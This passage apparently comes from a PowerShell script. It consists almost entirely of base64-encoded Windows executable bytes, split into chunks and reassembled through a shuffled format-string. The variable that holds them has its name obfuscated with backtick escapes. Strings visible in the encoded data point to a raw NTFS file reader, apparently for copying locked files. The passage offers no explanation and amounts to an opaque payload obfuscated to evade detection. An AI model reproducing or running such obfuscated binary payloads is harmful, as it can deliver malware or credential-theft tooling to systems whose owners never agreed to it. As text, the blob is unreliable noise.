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','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP7/////////SCcBgAEAAAAAAAAAAAAAAC4/QVZfSW9zdHJlYW1fZXJyb3JfY2F0ZWdvcnlAc3RkQEAAAAAAAABIJwGAAQAAAAAAAAAAAAAALj9BVl9TeXN0ZW1fZXJyb3JfY2F0ZWdvcnlAc3RkQEAAAAAAAAAAAEgnAYABAAAAAAAAAAAAAAAuP0FWZXJyb3JfY2F0ZWdvcnlAc3RkQEAAAAAAAAAAAEgnAYABAAAAAAAAAAAAAAAuP0FWX0dlbmVyaWNfZXJyb3JfY2F0ZWdvcnlAc3RkQEAAAAAAAAAASCcBgAEAAAAAAAAAAAAAAC4/QVY/JENBdHRyX0JpdG1hcEBWQ0F0dHJSZXNpZGVudEBAQEAAAABIJwGAAQAAAAAAAAAAAAAALj9BVj8kQ0F0dHJfQml0bWFwQFZDQXR0ck5vblJlc2lkZW50QEBAQAAAAAAAAAAASCcBgAEAAAAAAAAAAAAAAC4/QVY/JENBdHRyX0RhdGFAVkNBdHRyUmVzaWRlbnRAQEBAAAAAAABIJwGAAQAAAAAAAAAAAAAALj9BVj8kQ0F0dHJfRGF0YUBWQ0F0dHJOb25SZXNpZGVudEBAQEAAAEgnAYABAAAAAAAAAAAAAAAuP0FWPyRDQXR0cl9BdHRyTGlzdEBWQ0F0dHJSZXNpZGVudEBAQEAASCcBgAEAAAAAAAAAAAAAAC4/QVY/JENBdHRyX0F0dHJMaXN0QFZDQXR0ck5vblJlc2lkZW50QEBAQAAAAAAAAEgnAYABAAAAAAAAAAAAAAAuP0FWPyRDU0xpc3RAVkNGaWxlUmVjb3JkQEBA','AAAAAAOLIBAAAAAAAAAAAA3rQBAAAQAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABotAEAAAAAAH60AQAAAAAAkLQBAAAAAACgtAEAAAAAAKy0AQAAAAAAw')
	[String]${PEby`Te`s32} = ("{33}{31}{86}{108}{16}{124}{67}{56}{90}{134}{117}{35}{129}{132}{5}{133}{24}{60}{125}{7}{139}{128}{88}{111}{92}{21}{80}{48}{25}{73}{85}{9}{116}{4}{103}{113}{0}{66}{65}{39}{138}{42}{44}{2}{144}{68}{20}{77}{115}{8}{75}{102}{46}{114}{64}{52}{57}{82}{106}{76}{107}{94}{136}{17}{97}{27}{29}{54}{135}{93}{1}{89}{98}{119}{69}{78}{140}{100}{110}{36}{51}{53}{96}{109}{23}{11}{126}{43}{74}{59}{104}{10}{131}{145}{50}{81}{58}{143}{83}{121}{15}{91}{22}{127}{118}{28}{123}{55}{19}{70}{3}{84}{61}{14}{101}{32}{12}{18}{87}{62}{95}{71}{99}{45}{122}{120}{141}{63}{137}{130}{72}{142}{26}{79}{38}{105}{40}{49}{6}{47}{112}{30}{41}{34}{37}{13}"-f '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CLRRCJRfToQhwAAIuAgAAAAIlF+I1F8FCLRQj/MP9V+FlZg2X8AIN97AB0F2SLHQAAAACLA4tdyIkDZIkdAAAAAOsJi0XIZKMAAAAAi0X8W8nDVYvsUVGLRQhTi10Mi0gQVotwDFeJTfiL/ol1/IXbeDWLVRCD/v91C+jJIAAAi034i1UQTovGa8AUOVQIBH0GO1QICH4Fg/7/dQeLffxLiXX8hdt5zotFFEaJMItFGIk4i0UIO3gMdwQ793YI6IUgAACLTfhr9hRfjQQxXlvJw1WL7FFTi0UMg','YU45f//iZVA5f//gPsBdAWA+wJ1Vf+1POX//+j7DwAAWWY7hTzl//8PhRYEAACDxwKDvUDl//8AdCRqDVhQiYU85f//6NIPAABZZjuFPOX//w+F7QMAAEf/hSzl//+LhTjl//+LjTTl//87RRAPgsT9///rI4udMOX//4oCiwydaIwBEEeIRA40iwSdaIwBEMdEBjgBAAAAi7VA5f//6akDAACLtUDl///pqAMAAIuFMOX//4sEhWiMARD2RAYEgA+EVQMAAIuVROX//zP2ibU45f//hNsPheEAAACLwomFPOX//zl1EA+GkQMAADPJK8KLlTzl//+NnUjl//+JjUDl//87RRBzRIoKQkCIjSPl//+A+QqLjUDl//+JlTzl//91C/+FLOX//8YDDUNBipUj5f//iBOLlTzl//9DQYmNQOX//4H5/xMAAHK3i40U5f//jYVI5f//K9hqAI2FKOX//1BTjYVI5f//UIuFMOX//4sEhWiMARD/NAH/FVjwABCFwA+EuwIAAAO9KOX//4uVROX//zmdKOX//w+MsQIAAIuFPOX//yvCO0UQi4U85f//D4I1////6ZUCAACLyoD7Ag+F/gAAAImNQOX//zl1EA+GpwIAAMeFGOX//woAAACDpRzl//8Ai70s5f//i8ErwouVHOX//42dSOX//ztFEHM+D7cxg8ECg8ACiY1A5f//Zju1GOX//3UVag1ZZokLi41A5f//g8cCg8MCg8ICZokzg8ICg8MCgfr+EwAAcr2LjRTl//+NhUjl//8r2GoAjYUo5f//UFONhUjl//9Qi4Uw5f//ib0s5f//iwSFaIwBEP80Af8VWPAAEIu1OOX//4u9POX//4XAD4S0AQAAA70o5f//i5VE5f//ib085f//OZ0o5f//D4ykAQAAi41A5f//i8ErwjtFEA+CIP///+mMAQAAi10QiY0k5f//hdsPhKcBAADHhRjl//8KAAAAg6Uc5f//AIu1JOX//yvKi5Uc5f//jYVI','2nAAAAOh7/P//WVlqBliNnqAAAACNfhyJRQiBf/gEdgEQdB2LB4XAdBSDOAB1D1DoUPz///8z6En8//9ZWYtFCIN/9AB0FotH/IXAdAyDOAB1B1DoL','AAAAAIAAADgSAEQVEgBEDhIARDoRwEQAAAAAERKARAgTAEQAE0BEAAAAABgSgEQBEwBEABNARAAAAAAfEoBECBMARAATQEQAAAAAJhKARAETAEQAE0BEAAAAAC0SgEQIEwBEABNARAAAAAA0EoBEARMARAATQEQAAAAAOxKARAAAAAACEsBEARMARAATQEQAAAAAEBLARAgTAEQAE0BECRLARAAAAAAXEsBEDxMARAAAAAAeEsBECBMARAATQEQAAAAAJRLARAgTAEQAE0BEAAAAADMSwEQIEwBEABNARCwSwEQAAAAAOhLARAgTAEQAE0BEAAAAAAETAEQAE0BEAAAAAAgTAEQAE0BEAAAAAA8TAEQAAAAAFhMARAAAAAAdEwBEAAAAACQTAEQAAAAAKxMARAAAAAAyEwBEORMARAAAAAA5EwBEAAAAAAATQEQAAAAABh/ARACAAAAAAAAAP////8AAAAAQAAAABxNARBIfwEQAgAAAAAAAAD/////AAAAAEAAAAAsTQEQfH8BEAIAAAAAAAAA/////wAAAABAAAAAPE0BEKh/ARACAAAAAAAAAP////8AAAAAQAAAAExNARDYfwEQAgAAAAAAAAD/////AAAAAEAAAABcTQEQCIABEAIAAAAAAAAA/////wAAAABAAAAAbE0BEDyAARAAAAAAAAAAAP////8AAAAAQAAAAHxNARBkgAEQAgAAAAAAAAD/////AAAAAEAAAACMTQEQcIEBEAAAAAAoAAAA/////w','GUAAAMcAFgAAAOjgMQAAg8j/63WLRQxWi3UIhcB0GYX2dRXo9T8AAMcAFgAAAOi8MQAAg8j/61C5////f4lN5DvBdwOJReSNRRRQU/91EI1F4FDHRexCAAAAiXXoiXXg6BIzAACDxBCL+IX2dBr/TeR4B4tF4IgY6wyNReBQU+imMQAAWVmLx15fW8nDzMzMzMzMzMzMzMzMU1aLTCQMi1QkEItcJBT3w/////90USvK98IDAAAAdBgPtgQKOgJ1SIXAD0TYQoPrAXY09sIDdeiNBAol/w8AAD38DwAAd9mLBAo7AnXSg+sEdhSNsP/+/v6DwgT30CPGqYCAgIB00TPAXlvDjWQkABvAg8gBXlvDzMzMzMzMzMyLRCQMU4XAdFKLVCQIM9uKXCQM98IDAAAAdBaKCoPCATLLdHKD6AF0MvfCAwAAAHXqg+gEchJXi/vB4wgD34v7weMQA9/rG1+DwAR0DooKg8IBMst0QIPoAXXyW8OD6ARy5YsKM8u///7+fgP5g/H/M8+DwgSB4QABAYF04ItK/DLLdCMy63QZwekQMst0DDLrdALryF+NQv9bw41C/l9bw41C/V9bw41C/F9bw2oIaIhSARDodxUAAItFDIP4AXV66AtAAACFwHUHM8DpRgEAAOhTKQAAhcB1B+gHQAAA6+noO0cAAP8VLPAAEKMwoQEQ6KBGAACjrIUBEOjuPwAAhcB5B+iWKQAA68/o3kIAAIXAeCDoAkUAAIXAeBdqAOiUEQAAWYXAdQv/BaiFARDp4AAAAOhjQgAA68mFwHVloaiFARCFwH6CSKOohQEQg2X8AIM9xIUBEAB1BehJEQAA6BgQAACLdRCF9nUP6CtCAADoKSkAAOhrPwAAx0X8/v///+gIAAAA6YgAAACLdRCF9nUOgz0AdgEQ/3QF6P4oAADD63CD+AJ1Xv81AHYBEOhNKQAAWYXAdVtovA','g8QUM9JSUmaJFEiLRzBQ/3csUP93KFJS/xUA8AAQi0cwi08sxgQBAIvHi030ZIkNAAAAAFlfXovlXcIIAMzMzMzMzMzMzMzMzFWL7FaL8f92KMcGcEQBEOi0MgAA/3Ys6KwyAACDxAj2RQgBxwb4RAEQdAlW6JcyAACDxASLxl5dwgQAzMzMzMxVi+xq/2go6AAQZKEAAAAAUFFWo','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','bAwAAV1aLyOgM8P//i030ZIkNAAAAAFlfXluL5V3CCACAfggAdDlqUOjzKAAAg8QEiUUIx0X8AAAAAIXAD4TcAgAAV1aLyOjtFQAAi030ZIkNAAAAAFlfXluL5V3CCABqPOi6KAAAg8QEiUUIx0X8AQAAAIXAD4SjAgAAV1aLyOhEGAAAi030ZIkNAAAAAFlfXluL5V3CCABqPOiBKAAAg8QEiUUIx0X8AgAAAIXAD4RqAgAAV1aLyOir8v//i030ZIkNAAAAAFlfXluL5V3CCABqNOhIKAAAg8QEiUUIx0X8AwAAAIXAD4QxAgAAV1aLyOgC9P//i030ZIkNAAAAAFlfXluL5V3CCABqLOgPKAAAg8QEhcAPhAICAABXVovI6GPz//+LTfRkiQ0AAAAAWV9eW4vlXcIIAIB+CAB0V2o86NonAACL2IPEBIldCMdF/AQAAACF23QlV1aLy+hm5///xwPsQwEQi8OLTfRkiQ0AAAAAWV9eW4vlXcIIADPbi8OLTfRkiQ0AAAAAWV9eW4vlXcIIAGoo6IMnAACDxASFwA+EdgEAAFdWi8jo5xIAAItN9GSJDQAAAABZX15bi+VdwggAakDoVCcAAIPEBIlFCMdF/AUAAACFwA+EPQEAAFdWi8jonvb//4tN9GSJDQAAAABZX15bi+VdwggAakjoGycAAIPEBIlFCMdF/AYAAACFwA+EBAEAAFdWi8jo1fj//4tN9GSJDQAAAABZX15bi+VdwggAgH4IAHQ5aljo3CYAAIPEBIlFCMdF/AcAAACFwA+ExQAAAFdWi8joJhkAAItN9GSJDQAAAABZX15bi+VdwggAakDooyYAAIPEBIlFCMdF/AgAAACFwA+EjAAAAFdWi8jo7RkAAItN9GSJDQAAAABZX15bi+VdwggAgH4IAItFDMcAAQAAAHQ1ajzoWyYAAIPEBIlFCMdF/AkAAACFwHRIV1aLyOjp5f//i030ZIkNAAAAAFlfXluL5V3CCABqKOgmJgAAg8QEhcB0HVdWi8jovuT//4tN9GSJDQAAAABZX15bi+VdwggAM8CLTfRkiQ0AAAAAWV9eW4vlXcIIAEkvABB4LwAQ8C8AECkwABBiMAAQkTAAEB0xABBWMQAQjzEAEAcyABAACQkJCQkJCQkJCQkJCQkJAQkJCQkJCQkJCQkJCQkJCQIJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQMJCQkJCQkJCQkJCQkJCQkECQkJCQkJCQkJCQkJCQkJBQkJCQkJCQkJCQkJCQkJCQYJCQkJCQkJCQkJCQkJCQkHCQkJCQkJCQkJCQkJCQkJCMzMzMzMzMzMzMzMVYvsi0UIg+wQU1ZXi/mLCItABIXAdQWD+RBybYt3CIN+cAB0ZFBRagD/dhDo37AAAIlF9IlV+P92EOi6HAAAi1cIg8QEi0pwi9iLMY1FCFD/chCNRfRTUP9WDIXAdBaLTwiLRQg7QRB1C4vDX15bi+VdwgQAU+hNJAAAg8QEM8BfXluL5V3CBACLdwhQUWoA/3YQ6HiwAAADRhhqABNWHI1N+FFQiUX0iVX4/3Yg/xUE8AAQiUX0g/j/dQr/FQjwABCFwHVJi0cI/3AQ6CgcAACLTwiDxASL8GoAjUUIUP9xEFb/cSD/FQzwABCFwHQWi08Ii0UIO0EQdQuLxl9eW4vlXcIEAFbovCMAAIPEBF9eM8Bbi+VdwgQAzMzMzMzMVYvsVleL8ejE+f//i0YMhcB0EFDojyMAAIPEBMdGDAAAAACNRQhQi87osv7//4v4hf91FMdGEP/////HRhT/////X15dwggAi0UIiUYQi0UMiUYUgT9GSUxFdTgPt08ED7cUOYtGCAPPg8ECUQ+3SAiLQBBSM9L38YvOUFforvn//4XAdA6Jfgy4AQAAAF9eXcIIAFfoDiMAAIPEBDPAX15dwggAzMzMzMzMzMzMzMxVi+xq/2hL6gAQZKEAAAAAUIHsSAIAAKHAcAEQM8WJRexTVldQjUX0ZKMAAAAAi9GJldz9//+LTRCLRQiLXQyJjeD9//+LihgBAACJiiABAACFyXQFi0kE6wIzyYXJdQczwOl7AQAAx4XQ/f//AAAAAMeFzP3//wAAAADHhdT9//8AAAAAx4XI/f//AAAAAMeFxP3//2BEARDHhdj9//8AAAAAjZXE/f//UlDHRfwAAAAA6Bn1//+FwA+E8AAAAIu9zP3//4m91P3//4X/D4TcAAAAi3cEhfYPhNEAAACL/4N+DAB+bWgEAQAAjYXk/f//UGr/U2oAagD/FRDwABCFwA+EkQAAAI2F5P3//1CLzuh76///hcAPhOMAAAB5eYtWGIXSD4SFAAAAD7ZCDIPgAXR8D7dKCItEEfiJhbz9//+LRBH8iYXA/f//jYW8/f//6y6LVhiF0nQ+D7ZCDIPgAXQ1D7dKCItEEfiJhbT9//+LRBH8iYW4/f//jYW0/f///7Xg/f//i43c/f//U1DobP7//4XAdXSLP4m91P3//4X/dAuLdwSF9g+FMf///zP2x0X8/////4uF2P3//4XAdAlQ6DAhAACDxASNjcT9///HhcT9//8IRAEQ6PALAACLxotN9GSJDQAAAABZX15bi03sM83oOBkAAIvlXcIMAIuN4P3//1bodO///74BAAAA657MzMzMzMzMzMzMzMzMVYvsg+T4g+wMU1ZXi/no7fb//4tHDA+3WBSLDAONNAOJXCQQg/n/D4QHAQAAjUkAi0YEi1cIA8M7QhAPh/MAAADB6QS4AQAAAI1Z/4vL0+CFR1gPhMIAAACD+xAPg94AAACLRJ8Yx0QkDAAAAACFwHUIi0SaKIXAdBKNTCQMUVb/0IPECIN8JAwAdVaNRCQUUFaLz8dEJBwAAAAA6A/3//+JRCQUhcAPhJMAAACNBJtqCI0ch+huIAAAg8QEhcB0IYtMJBSJSATHAAAAAACLS2iFyXUFiUNk6wKJAf9DYIlDaItPZIlPbIXJdBSLQQSFwHQNi0Aoi0AgJQBAAAB1QIlPbIXJdBSLQQSFwHQNi0Aoi0AgJQAIAAB1JYtcJBADXgQDdgSJXCQQiw6D+f8Phfz+//+4AQAAAF9eW4vlXcNfXjPAW4vlXcPMzMzMzMzMVYvsgewsAgAAocBwARAzxYlF/FOLXQiLwYtNDFZXi7gEAQAAiYXo/f//iY3s/f//ibgMAQAAhf90BYt/BOsC